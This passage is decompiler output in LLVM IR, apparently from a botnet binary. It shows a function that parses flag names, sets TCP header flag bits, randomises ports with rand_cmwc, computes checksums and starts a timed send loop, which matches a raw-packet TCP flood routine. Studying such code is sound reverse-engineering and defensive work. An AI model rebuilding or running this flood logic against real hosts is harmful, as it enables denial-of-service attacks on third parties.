  store i32 ptrtoint ([5 x i8]* @global_var_8069868.167 to i32), i32* @edi, align 4
  %v6_804f3fc = call i32 @_strncmp(i8* %v5_804f2fc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069868.167, i32 0, i32 0), i32 5)
  %v7_804f3fc = urem i32 %v6_804f3fc, 2
  %v8_804f3fc = icmp eq i32 %v7_804f3fc, 0
  %v0_804f3fe = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3fe = or i1 %v0_804f3fe, %v8_804f3fc
  %v3_804f3fe = zext i1 %v2_804f3fe to i32
  %v4_804f3fe = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3fe = and i32 %v4_804f3fe, -256
  %v6_804f3fe = or i32 %v3_804f3fe, %v5_804f3fe
  %v7_804f3fe = xor i32 %v6_804f3fe, 1
  store i32 %v7_804f3fe, i32* @edx, align 4
  %v3_804f404 = and i32 %v6_804f3fc, -256
  %v1_804f406 = trunc i32 %v7_804f3fe to i8
  %v3_804f406 = zext i1 %v0_804f3fe to i8
  %v4_804f406 = sub nsw i8 %v1_804f406, %v3_804f406
  %v15_804f406 = icmp eq i8 %v4_804f406, 0
  %v20_804f406 = zext i8 %v4_804f406 to i32
  %v23_804f406 = or i32 %v20_804f406, %v3_804f404
  store i32 %v23_804f406, i32* @ecx, align 4
  %v2_804f40a = sext i8 %v4_804f406 to i32
  store i32 %v2_804f40a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f40f = icmp eq i1 %v15_804f406, false
  br i1 %v1_804f40f, label %dec_label_pc_804f42e, label %dec_label_pc_804f411

dec_label_pc_804f411:                             ; preds = %dec_label_pc_804f3cc
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v1_804f414 = add i32 %v2_804f255, 33
  %v2_804f414 = inttoptr i32 %v1_804f414 to i8*
  %v3_804f414 = load i8, i8* %v2_804f414, align 1
  %v4_804f414 = zext i8 %v3_804f414 to i32
  %v6_804f414 = and i32 %v2_804f40a, -256
  %v7_804f414 = or i32 %v6_804f414, %v4_804f414
  %v1_804f417 = or i32 %v7_804f414, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f417 = trunc i32 %v1_804f417 to i8
  store i32 %v1_804f417, i32* %eax.global-to-local, align 4
  store i8 %v3_804f417, i8* %v2_804f414, align 1
  store i32 %v1_804f26d, i32* %edx.global-to-local, align 4
  %v3_804f420 = load i8, i8* %v2_804f414, align 1
  %v4_804f420 = zext i8 %v3_804f420 to i32
  %v5_804f420 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f420 = and i32 %v5_804f420, -256
  %v7_804f420 = or i32 %v4_804f420, %v6_804f420
  %v1_804f423 = or i32 %v7_804f420, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f423 = trunc i32 %v1_804f423 to i8
  store i32 %v1_804f423, i32* %eax.global-to-local, align 4
  store i8 %v3_804f423, i8* %v2_804f414, align 1
  br label %dec_label_pc_804f665

dec_label_pc_804f42e:                             ; preds = %dec_label_pc_804f3cc
  store i32 %v3_804f13c, i32* @eax, align 4
  %v0_804f431 = load i32, i32* @esp, align 4
  %v5_804f431 = icmp ult i32 %v0_804f431, 8
  store i1 %v5_804f431, i1* %cf.global-to-local, align 1
  %v1_804f434 = add i32 %v0_804f431, -12
  %v2_804f434 = inttoptr i32 %v1_804f434 to i32*
  store i32 ptrtoint (i32* @global_var_806986d.168 to i32), i32* %v2_804f434, align 4
  %v0_804f439 = load i32, i32* @eax, align 4
  %v2_804f439 = add i32 %v0_804f431, -16
  %v3_804f439 = inttoptr i32 %v2_804f439 to i32*
  store i32 %v0_804f439, i32* %v3_804f439, align 4
  %v3_804f43a = call i32 @__GI_strtok(i32 5, i32 ptrtoint ([5 x i8]* @global_var_8069868.167 to i32))
  store i32 %v3_804f43a, i32* %eax.global-to-local, align 4
  %v5_804f442 = inttoptr i32 %v3_804f43a to i8*
  store i8* %v5_804f442, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f65b26 = icmp eq i32 %v3_804f43a, 0
  %v1_804f65f33 = icmp eq i1 %v5_804f65b26, false
  br i1 %v1_804f65f33, label %dec_label_pc_804f44a.lr.ph, label %dec_label_pc_804f665

dec_label_pc_804f44a.lr.ph:                       ; preds = %dec_label_pc_804f42e
  %v1_804f63d = add i32 %v2_804f255, 33
  %v2_804f63d = inttoptr i32 %v1_804f63d to i8*
  %tmp118 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804f44a

dec_label_pc_804f44a:                             ; preds = %dec_label_pc_804f44a.lr.ph, %dec_label_pc_804f646
  %v3_804f5f5 = phi i8* [ %v5_804f442, %dec_label_pc_804f44a.lr.ph ], [ %tmp119, %dec_label_pc_804f646 ]
  %stack_var_-224.135 = phi i8* [ %tmp52, %dec_label_pc_804f44a.lr.ph ], [ %stack_var_-224.0, %dec_label_pc_804f646 ]
  %stack_var_-228.134 = phi i32 [ %tmp51, %dec_label_pc_804f44a.lr.ph ], [ %stack_var_-228.0, %dec_label_pc_804f646 ]
  %v4_804f44a = ptrtoint i8* %v3_804f5f5 to i32
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806986f.169 to i32), i32* @edi, align 4
  %v6_804f47a = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806986f.169, i32 0, i32 0), i32 4)
  %v7_804f47a = urem i32 %v6_804f47a, 2
  %v8_804f47a = icmp eq i32 %v7_804f47a, 0
  %v0_804f47c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f47c = or i1 %v0_804f47c, %v8_804f47a
  %v3_804f47c = zext i1 %v2_804f47c to i32
  %v4_804f47c = load i32, i32* @edx, align 4
  %v5_804f47c = and i32 %v4_804f47c, -256
  %v6_804f47c = or i32 %v3_804f47c, %v5_804f47c
  %v7_804f47c = xor i32 %v6_804f47c, 1
  store i32 %v7_804f47c, i32* %edx.global-to-local, align 4
  %v3_804f482 = and i32 %v6_804f47a, -256
  %v1_804f484 = trunc i32 %v7_804f47c to i8
  %v3_804f484 = zext i1 %v0_804f47c to i8
  %v4_804f484 = sub nsw i8 %v1_804f484, %v3_804f484
  %v15_804f484 = icmp eq i8 %v4_804f484, 0
  %v20_804f484 = zext i8 %v4_804f484 to i32
  %v23_804f484 = or i32 %v20_804f484, %v3_804f482
  store i32 %v23_804f484, i32* @ecx, align 4
  %v2_804f488 = sext i8 %v4_804f484 to i32
  store i32 %v2_804f488, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f48d = icmp eq i1 %v15_804f484, false
  br i1 %v1_804f48d, label %dec_label_pc_804f4a0, label %dec_label_pc_804f48f

dec_label_pc_804f48f:                             ; preds = %dec_label_pc_804f44a
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f492 = load i8, i8* %v2_804f63d, align 1
  %v4_804f492 = zext i8 %v3_804f492 to i32
  %v7_804f492 = or i32 %v5_804f47c, %v4_804f492
  %v1_804f495 = or i32 %v7_804f492, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f495 = trunc i32 %v1_804f495 to i8
  store i32 %v1_804f495, i32* @edx, align 4
  store i8 %v3_804f495, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f4a0:                             ; preds = %dec_label_pc_804f44a
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069873.170 to i32), i32* @edi, align 4
  %v6_804f4d0 = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069873.170, i32 0, i32 0), i32 4)
  %v7_804f4d0 = urem i32 %v6_804f4d0, 2
  %v8_804f4d0 = icmp eq i32 %v7_804f4d0, 0
  %v0_804f4d2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f4d2 = or i1 %v0_804f4d2, %v8_804f4d0
  %v3_804f4d2 = zext i1 %v2_804f4d2 to i32
  %v4_804f4d2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f4d2 = and i32 %v4_804f4d2, -256
  %v6_804f4d2 = or i32 %v3_804f4d2, %v5_804f4d2
  %v7_804f4d2 = xor i32 %v6_804f4d2, 1
  store i32 %v7_804f4d2, i32* %edx.global-to-local, align 4
  %v3_804f4d8 = and i32 %v6_804f4d0, -256
  %v1_804f4da = trunc i32 %v7_804f4d2 to i8
  %v3_804f4da = zext i1 %v0_804f4d2 to i8
  %v4_804f4da = sub nsw i8 %v1_804f4da, %v3_804f4da
  %v15_804f4da = icmp eq i8 %v4_804f4da, 0
  %v20_804f4da = zext i8 %v4_804f4da to i32
  %v23_804f4da = or i32 %v20_804f4da, %v3_804f4d8
  store i32 %v23_804f4da, i32* @ecx, align 4
  %v2_804f4de = sext i8 %v4_804f4da to i32
  store i32 %v2_804f4de, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f4e3 = icmp eq i1 %v15_804f4da, false
  br i1 %v1_804f4e3, label %dec_label_pc_804f4f6, label %dec_label_pc_804f4e5

dec_label_pc_804f4e5:                             ; preds = %dec_label_pc_804f4a0
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f4e8 = load i8, i8* %v2_804f63d, align 1
  %v4_804f4e8 = zext i8 %v3_804f4e8 to i32
  %v7_804f4e8 = or i32 %v5_804f4d2, %v4_804f4e8
  %v1_804f4eb = or i32 %v7_804f4e8, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f4eb = trunc i32 %v1_804f4eb to i8
  store i32 %v1_804f4eb, i32* @edx, align 4
  store i8 %v3_804f4eb, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f4f6:                             ; preds = %dec_label_pc_804f4a0
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069877.171 to i32), i32* @edi, align 4
  %v6_804f526 = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069877.171, i32 0, i32 0), i32 4)
  %v7_804f526 = urem i32 %v6_804f526, 2
  %v8_804f526 = icmp eq i32 %v7_804f526, 0
  %v0_804f528 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f528 = or i1 %v0_804f528, %v8_804f526
  %v3_804f528 = zext i1 %v2_804f528 to i32
  %v4_804f528 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f528 = and i32 %v4_804f528, -256
  %v6_804f528 = or i32 %v3_804f528, %v5_804f528
  %v7_804f528 = xor i32 %v6_804f528, 1
  store i32 %v7_804f528, i32* %edx.global-to-local, align 4
  %v3_804f52e = and i32 %v6_804f526, -256
  %v1_804f530 = trunc i32 %v7_804f528 to i8
  %v3_804f530 = zext i1 %v0_804f528 to i8
  %v4_804f530 = sub nsw i8 %v1_804f530, %v3_804f530
  %v15_804f530 = icmp eq i8 %v4_804f530, 0
  %v20_804f530 = zext i8 %v4_804f530 to i32
  %v23_804f530 = or i32 %v20_804f530, %v3_804f52e
  store i32 %v23_804f530, i32* @ecx, align 4
  %v2_804f534 = sext i8 %v4_804f530 to i32
  store i32 %v2_804f534, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f539 = icmp eq i1 %v15_804f530, false
  br i1 %v1_804f539, label %dec_label_pc_804f54c, label %dec_label_pc_804f53b

dec_label_pc_804f53b:                             ; preds = %dec_label_pc_804f4f6
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f53e = load i8, i8* %v2_804f63d, align 1
  %v4_804f53e = zext i8 %v3_804f53e to i32
  %v7_804f53e = or i32 %v5_804f528, %v4_804f53e
  %v1_804f541 = or i32 %v7_804f53e, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f541 = trunc i32 %v1_804f541 to i8
  store i32 %v1_804f541, i32* @edx, align 4
  store i8 %v3_804f541, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f54c:                             ; preds = %dec_label_pc_804f4f6
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806987b.172 to i32), i32* @edi, align 4
  %v6_804f57c = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806987b.172, i32 0, i32 0), i32 4)
  %v7_804f57c = urem i32 %v6_804f57c, 2
  %v8_804f57c = icmp eq i32 %v7_804f57c, 0
  %v0_804f57e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f57e = or i1 %v0_804f57e, %v8_804f57c
  %v3_804f57e = zext i1 %v2_804f57e to i32
  %v4_804f57e = load i32, i32* %edx.global-to-local, align 4
  %v5_804f57e = and i32 %v4_804f57e, -256
  %v6_804f57e = or i32 %v3_804f57e, %v5_804f57e
  %v7_804f57e = xor i32 %v6_804f57e, 1
  store i32 %v7_804f57e, i32* %edx.global-to-local, align 4
  %v3_804f584 = and i32 %v6_804f57c, -256
  %v1_804f586 = trunc i32 %v7_804f57e to i8
  %v3_804f586 = zext i1 %v0_804f57e to i8
  %v4_804f586 = sub nsw i8 %v1_804f586, %v3_804f586
  %v15_804f586 = icmp eq i8 %v4_804f586, 0
  %v20_804f586 = zext i8 %v4_804f586 to i32
  %v23_804f586 = or i32 %v20_804f586, %v3_804f584
  store i32 %v23_804f586, i32* @ecx, align 4
  %v2_804f58a = sext i8 %v4_804f586 to i32
  store i32 %v2_804f58a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f58f = icmp eq i1 %v15_804f586, false
  br i1 %v1_804f58f, label %dec_label_pc_804f5a2, label %dec_label_pc_804f591

dec_label_pc_804f591:                             ; preds = %dec_label_pc_804f54c
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f594 = load i8, i8* %v2_804f63d, align 1
  %v4_804f594 = zext i8 %v3_804f594 to i32
  %v7_804f594 = or i32 %v5_804f57e, %v4_804f594
  %v1_804f597 = or i32 %v7_804f594, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f597 = trunc i32 %v1_804f597 to i8
  store i32 %v1_804f597, i32* @edx, align 4
  store i8 %v3_804f597, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f5a2:                             ; preds = %dec_label_pc_804f54c
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806987f.173 to i32), i32* @edi, align 4
  %v6_804f5d2 = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806987f.173, i32 0, i32 0), i32 4)
  %v7_804f5d2 = urem i32 %v6_804f5d2, 2
  %v8_804f5d2 = icmp eq i32 %v7_804f5d2, 0
  %v0_804f5d4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f5d4 = or i1 %v0_804f5d4, %v8_804f5d2
  %v3_804f5d4 = zext i1 %v2_804f5d4 to i32
  %v4_804f5d4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f5d4 = and i32 %v4_804f5d4, -256
  %v6_804f5d4 = or i32 %v3_804f5d4, %v5_804f5d4
  %v7_804f5d4 = xor i32 %v6_804f5d4, 1
  store i32 %v7_804f5d4, i32* %edx.global-to-local, align 4
  %v3_804f5da = and i32 %v6_804f5d2, -256
  %v1_804f5dc = trunc i32 %v7_804f5d4 to i8
  %v3_804f5dc = zext i1 %v0_804f5d4 to i8
  %v4_804f5dc = sub nsw i8 %v1_804f5dc, %v3_804f5dc
  %v15_804f5dc = icmp eq i8 %v4_804f5dc, 0
  %v20_804f5dc = zext i8 %v4_804f5dc to i32
  %v23_804f5dc = or i32 %v20_804f5dc, %v3_804f5da
  store i32 %v23_804f5dc, i32* @ecx, align 4
  %v2_804f5e0 = sext i8 %v4_804f5dc to i32
  store i32 %v2_804f5e0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5e5 = icmp eq i1 %v15_804f5dc, false
  br i1 %v1_804f5e5, label %dec_label_pc_804f5f5, label %dec_label_pc_804f5e7

dec_label_pc_804f5e7:                             ; preds = %dec_label_pc_804f5a2
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f5ea = load i8, i8* %v2_804f63d, align 1
  %v4_804f5ea = zext i8 %v3_804f5ea to i32
  %v7_804f5ea = or i32 %v5_804f5d4, %v4_804f5ea
  %v1_804f5ed = or i32 %v7_804f5ea, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f5ed = trunc i32 %v1_804f5ed to i8
  store i32 %v1_804f5ed, i32* @edx, align 4
  store i8 %v3_804f5ed, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f5f5:                             ; preds = %dec_label_pc_804f5a2
  store i32 %v4_804f44a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f44a, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069883.174 to i32), i32* @edi, align 4
  %v6_804f625 = call i32 @_strncmp(i8* %v3_804f5f5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069883.174, i32 0, i32 0), i32 4)
  %v7_804f625 = urem i32 %v6_804f625, 2
  %v8_804f625 = icmp eq i32 %v7_804f625, 0
  %v0_804f627 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f627 = or i1 %v0_804f627, %v8_804f625
  %v3_804f627 = zext i1 %v2_804f627 to i32
  %v4_804f627 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f627 = and i32 %v4_804f627, -256
  %v6_804f627 = or i32 %v3_804f627, %v5_804f627
  %v7_804f627 = xor i32 %v6_804f627, 1
  store i32 %v7_804f627, i32* @edx, align 4
  %v3_804f62d = and i32 %v6_804f625, -256
  %v1_804f62f = trunc i32 %v7_804f627 to i8
  %v3_804f62f = zext i1 %v0_804f627 to i8
  %v4_804f62f = sub nsw i8 %v1_804f62f, %v3_804f62f
  %v15_804f62f = icmp eq i8 %v4_804f62f, 0
  %v20_804f62f = zext i8 %v4_804f62f to i32
  %v23_804f62f = or i32 %v20_804f62f, %v3_804f62d
  store i32 %v23_804f62f, i32* @ecx, align 4
  %v2_804f633 = sext i8 %v4_804f62f to i32
  store i32 %v2_804f633, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f638 = icmp eq i1 %v15_804f62f, false
  br i1 %v1_804f638, label %dec_label_pc_804f646, label %dec_label_pc_804f63a

dec_label_pc_804f63a:                             ; preds = %dec_label_pc_804f5f5
  store i32 %v1_804f26d, i32* @eax, align 4
  %v3_804f63d = load i8, i8* %v2_804f63d, align 1
  %v4_804f63d = zext i8 %v3_804f63d to i32
  %v7_804f63d = or i32 %v5_804f627, %v4_804f63d
  %v1_804f640 = or i32 %v7_804f63d, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804f640 = trunc i32 %v1_804f640 to i8
  store i32 %v1_804f640, i32* @edx, align 4
  store i8 %v3_804f640, i8* %v2_804f63d, align 1
  br label %dec_label_pc_804f646

dec_label_pc_804f646:                             ; preds = %dec_label_pc_804f5f5, %dec_label_pc_804f5e7, %dec_label_pc_804f591, %dec_label_pc_804f53b, %dec_label_pc_804f4e5, %dec_label_pc_804f48f, %dec_label_pc_804f63a
  %stack_var_-228.0 = phi i32 [ 4, %dec_label_pc_804f5f5 ], [ 4, %dec_label_pc_804f63a ], [ %stack_var_-228.134, %dec_label_pc_804f5e7 ], [ %stack_var_-228.134, %dec_label_pc_804f591 ], [ %stack_var_-228.134, %dec_label_pc_804f53b ], [ %stack_var_-228.134, %dec_label_pc_804f4e5 ], [ %stack_var_-228.134, %dec_label_pc_804f48f ]
  %stack_var_-224.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069883.174, i32 0, i32 0), %dec_label_pc_804f5f5 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069883.174, i32 0, i32 0), %dec_label_pc_804f63a ], [ %stack_var_-224.135, %dec_label_pc_804f5e7 ], [ %stack_var_-224.135, %dec_label_pc_804f591 ], [ %stack_var_-224.135, %dec_label_pc_804f53b ], [ %stack_var_-224.135, %dec_label_pc_804f4e5 ], [ %stack_var_-224.135, %dec_label_pc_804f48f ]
  %v0_804f646 = load i32, i32* @esp, align 4
  %v5_804f646 = icmp ult i32 %v0_804f646, 8
  store i1 %v5_804f646, i1* %cf.global-to-local, align 1
  %v1_804f649 = add i32 %v0_804f646, -12
  %v2_804f649 = inttoptr i32 %v1_804f649 to i32*
  store i32 ptrtoint (i32* @global_var_806986d.168 to i32), i32* %v2_804f649, align 4
  %v1_804f64e = add i32 %v0_804f646, -16
  %v2_804f64e = inttoptr i32 %v1_804f64e to i32*
  store i32 0, i32* %v2_804f64e, align 4
  %v2_804f650 = ptrtoint i8* %stack_var_-224.0 to i32
  %v3_804f650 = call i32 @__GI_strtok(i32 %stack_var_-228.0, i32 %v2_804f650)
  store i32 %v3_804f650, i32* %eax.global-to-local, align 4
  store i32 %v3_804f650, i32* %tmp118, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f65b = icmp eq i32 %v3_804f650, 0
  %v1_804f65f = icmp eq i1 %v5_804f65b, false
  %tmp119 = inttoptr i32 %v3_804f650 to i8*
  br i1 %v1_804f65f, label %dec_label_pc_804f44a, label %dec_label_pc_804f665

dec_label_pc_804f665:                             ; preds = %dec_label_pc_804f646, %dec_label_pc_804f42e, %dec_label_pc_804f411, %dec_label_pc_804f3a3, %dec_label_pc_804f311
  %v0_804f665 = load i8*, i8** %stack_var_-20, align 4
  %v1_804f665 = ptrtoint i8* %v0_804f665 to i32
  %v2_804f665 = call i32 @rand_cmwc(i32 %v1_804f665)
  %sext12 = mul i32 %v2_804f665, 65536
  %v1_804f66a = sdiv i32 %sext12, 65536
  store i32 %v1_804f66a, i32* %edx.global-to-local, align 4
  %v1_804f66f = trunc i32 %v1_804f66a to i16
  %v3_804f66f = add i32 %v2_804f255, 34
  %v4_804f66f = inttoptr i32 %v3_804f66f to i16*
  store i16 %v1_804f66f, i16* %v4_804f66f, align 2
  %v1_804f676 = add i32 %v2_804f255, 36
  %v2_804f676 = inttoptr i32 %v1_804f676 to i16*
  store i16 0, i16* %v2_804f676, align 4
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  %v1_804f67f = add i32 %v2_804f255, 38
  %v2_804f67f = inttoptr i32 %v1_804f67f to i16*
  store i16 0, i16* %v2_804f67f, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804f16d, label %dec_label_pc_804f696, label %dec_label_pc_804f68b

dec_label_pc_804f68b:                             ; preds = %dec_label_pc_804f665
  %v0_804f68b = load i8*, i8** %stack_var_-20, align 4
  %v1_804f68b = ptrtoint i8* %v0_804f68b to i32
  %v2_804f68b = call i32 @rand_cmwc(i32 %v1_804f68b)
  store i32 %v2_804f68b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f6ae

dec_label_pc_804f696:                             ; preds = %dec_label_pc_804f665
  %v1_804f699 = urem i32 %v3_804f12a, 65536
  store i32 %v1_804f699, i32* %eax.global-to-local, align 4
  %v0_804f69e = load i32, i32* @esp, align 4
  %v5_804f69e = icmp ult i32 %v0_804f69e, 12
  store i1 %v5_804f69e, i1* %cf.global-to-local, align 1
  %v2_804f6a1 = add i32 %v0_804f69e, -16
  %v3_804f6a1 = inttoptr i32 %v2_804f6a1 to i32*
  store i32 %v1_804f699, i32* %v3_804f6a1, align 4
  %v1_804f6a2 = sext i16 %tmp50 to i32
  %v2_804f6a2 = call i32 @htons(i32 %v1_804f6a2)
  store i32 %v2_804f6a2, i32* %eax.global-to-local, align 4
  %v0_804f6a7 = load i32, i32* @esp, align 4
  %v2_804f6a7 = icmp ugt i32 %v0_804f6a7, -17
  store i1 %v2_804f6a7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f6ae

dec_label_pc_804f6ae:                             ; preds = %dec_label_pc_804f68b, %dec_label_pc_804f696
  %storemerge.in = phi i32 [ %v2_804f6a2, %dec_label_pc_804f696 ], [ %v2_804f68b, %dec_label_pc_804f68b ]
  %storemerge = trunc i32 %storemerge.in to i16
  %v4_804f6b1 = urem i32 %storemerge.in, 65536
  %v5_804f6b1 = load i32, i32* @esi, align 4
  %v6_804f6b1 = and i32 %v5_804f6b1, -65536
  %v7_804f6b1 = or i32 %v6_804f6b1, %v4_804f6b1
  store i32 %v7_804f6b1, i32* @esi, align 4
  %v3_804f6b5 = add i32 %v2_804f255, 22
  %v4_804f6b5 = inttoptr i32 %v3_804f6b5 to i16*
  store i16 %storemerge, i16* %v4_804f6b5, align 2
  store i32 %v1_804f26d, i32* %eax.global-to-local, align 4
  store i32 %v2_804f255, i32* %edx.global-to-local, align 4
  %v1_804f6bf = load i32, i32* @esp, align 4
  %v2_804f6bf = add i32 %v1_804f6bf, -4
  %v3_804f6bf = inttoptr i32 %v2_804f6bf to i32*
  store i32 %v1_804f26d, i32* %v3_804f6bf, align 4
  %v0_804f6c0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f6c0 = add i32 %v1_804f6bf, -8
  %v3_804f6c0 = inttoptr i32 %v2_804f6c0 to i32*
  store i32 %v0_804f6c0, i32* %v3_804f6c0, align 4
  %sext17 = mul i32 %storemerge.in, 65536
  %v1_804f6c1 = sdiv i32 %sext17, 65536
  %v3_804f6c1 = inttoptr i32 %v1_804f6c1 to i16*
  %v4_804f6c1 = call i32 @csum(i16* %v3_804f6c1, i32 ptrtoint (i32* @0 to i32))
  %v5_804f6c1 = trunc i32 %v4_804f6c1 to i16
  %sext18 = mul i32 %v4_804f6c1, 65536
  %v1_804f6c9 = sdiv i32 %sext18, 65536
  store i32 %v1_804f6c9, i32* %edx.global-to-local, align 4
  store i16 %v5_804f6c1, i16* %v2_804f676, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v1_804f6d5 = or i32 %v2_804f255, 2
  %v2_804f6d5 = inttoptr i32 %v1_804f6d5 to i16*
  %v3_804f6d5 = load i16, i16* %v2_804f6d5, align 2
  %v4_804f6d5 = zext i16 %v3_804f6d5 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804f6d5, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v1_804f6e4 = load i32, i32* @esp, align 4
  %v2_804f6e4 = add i32 %v1_804f6e4, -4
  %v3_804f6e4 = inttoptr i32 %v2_804f6e4 to i32*
  store i32 %v4_804f6d5, i32* %v3_804f6e4, align 4
  %v0_804f6e5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f6e5 = add i32 %v1_804f6e4, -8
  %v3_804f6e5 = inttoptr i32 %v2_804f6e5 to i32*
  store i32 %v0_804f6e5, i32* %v3_804f6e5, align 4
  %v4_804f6e6 = call i32 @csum(i16* %v3_804f6c1, i32 ptrtoint (i32* @0 to i32))
  %v5_804f6e6 = trunc i32 %v4_804f6e6 to i16
  %sext20 = mul i32 %v4_804f6e6, 65536
  %v1_804f6ee = sdiv i32 %sext20, 65536
  store i32 %v1_804f6ee, i32* %edx.global-to-local, align 4
  store i32 %v2_804f255, i32* %eax.global-to-local, align 4
  %v3_804f6f3 = or i32 %v2_804f255, 10
  %v4_804f6f3 = inttoptr i32 %v3_804f6f3 to i16*
  store i16 %v5_804f6e6, i16* %v4_804f6f3, align 2
  %v0_804f6f7 = load i32, i32* @esp, align 4
  %v5_804f6f7 = icmp ult i32 %v0_804f6f7, 12
  store i1 %v5_804f6f7, i1* %cf.global-to-local, align 1
  %v1_804f6fa = add i32 %v0_804f6f7, -16
  %v2_804f6fa = inttoptr i32 %v1_804f6fa to i32*
  store i32 0, i32* %v2_804f6fa, align 4
  %v2_804f6fc = inttoptr i32 %v1_804f6c1 to i32*
  %v3_804f6fc = call i32 @__GI_time(i32* %v2_804f6fc)
  %v0_804f701 = load i32, i32* @esp, align 4
  %v1_804f701 = add i32 %v0_804f701, 16
  %v5_804f704 = add i32 %v3_804f6fc, %v3_804f133
  %v10_804f704 = icmp ult i32 %v5_804f704, %v3_804f6fc
  store i1 %v10_804f704, i1* %cf.global-to-local, align 1
  store i32 %v5_804f704, i32* %eax.global-to-local, align 4
  %v2_804f746 = or i32 %v2_804f255, 12
  %v3_804f746 = inttoptr i32 %v2_804f746 to i32*
  %v3_804f753 = or i32 %v2_804f255, 4
  %v4_804f753 = inttoptr i32 %v3_804f753 to i16*
  br label %dec_label_pc_804f713

dec_label_pc_804f713:                             ; preds = %dec_label_pc_804f7c0, %dec_label_pc_804f7de, %dec_label_pc_804f6ae
  %v0_804f719 = phi i32 [ %v1_804f701, %dec_label_pc_804f6ae ], [ %v0_804f719.pre.pre, %dec_label_pc_804f7de ], [ %v1_804f7ca, %dec_label_pc_804f7c0 ]
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_804f6ae ], [ %v4_804f7de, %dec_label_pc_804f7de ], [ 0, %dec_label_pc_804f7c0 ]
